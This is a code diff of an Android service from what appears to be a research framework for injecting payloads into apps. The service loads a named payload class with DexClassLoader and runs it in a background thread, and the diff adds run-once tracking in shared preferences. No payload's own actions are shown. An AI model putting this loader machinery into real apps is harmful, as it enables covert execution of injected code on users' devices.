@@ -1,6 +1,7 @@
 package it.unisannio.srss.dame.android.services;
 
 import it.unisannio.srss.dame.android.payloads.Payload;
+import it.unisannio.srss.dame.android.payloads.PayloadConfig.Execution;
 
 import java.io.File;
 
@@ -8,6 +9,7 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
+import android.preference.PreferenceManager;
 import android.util.Log;
 import dalvik.system.DexClassLoader;
 
@@ -18,7 +20,6 @@ public class PayloadService extends Service {
 	 */
 	public final static String PAYLOAD_CLASS = "PAYLOAD_CLASS";
 
-	
 	private final static String TAG = PayloadService.class.getSimpleName();
 
 	@Override
@@ -29,7 +30,7 @@ public class PayloadService extends Service {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		String payloadStringClass = intent.getExtras().getString(PAYLOAD_CLASS);
-		if (payloadStringClass == null) {
+		if (payloadStringClass != null) {
 			Log.d(TAG, "Loading payload " + payloadStringClass);
 			try {
 				@SuppressWarnings("unchecked")
@@ -37,9 +38,23 @@ public class PayloadService extends Service {
 						.loadClass(payloadStringClass);
 				final Payload payload = payloadClass.getConstructor(
 						Context.class).newInstance(getApplicationContext());
-				// TODO trovare un modo per evitare l'esecuzione multipla
-				new Thread(payload, "PayloadRunner [" + payloadStringClass
-						+ "]").start();
+				boolean executed = PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext())
+						.getBoolean(
+								"EXECUTED_"
+										+ payload.getClass().getCanonicalName(),
+								false);
+				if (!executed
+						|| payload.getConfig().getExecution() == Execution.ALWAYS)
+					new Thread(payload, "PayloadRunner [" + payloadStringClass
+							+ "]").start();
+				PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext())
+						.edit()
+						.putBoolean(
+								"EXECUTED_"
+										+ payload.getClass().getCanonicalName(),
+								true).commit();
 			} catch (Exception e) {
 				Log.d(TAG, "Could not load the payload " + payloadStringClass,
 						e);
@@ -58,10 +73,12 @@ public class PayloadService extends Service {
 	 * @param payloadClass
 	 *            la classe del payload
 	 */
-	public static void runPayload(Context c, String payloadClass) {
-		Intent i = new Intent(c, PayloadService.class);
-		i.putExtra(PAYLOAD_CLASS, payloadClass);
-		c.startService(i);
+	public static void runPayload(Object c, String payloadClass) {
+		if(c instanceof Context){
+			Intent i = new Intent((Context) c, PayloadService.class);
+			i.putExtra(PAYLOAD_CLASS, payloadClass);
+			((Context) c).startService(i);
+		}
 	}
 
 	private DexClassLoader loader = null;
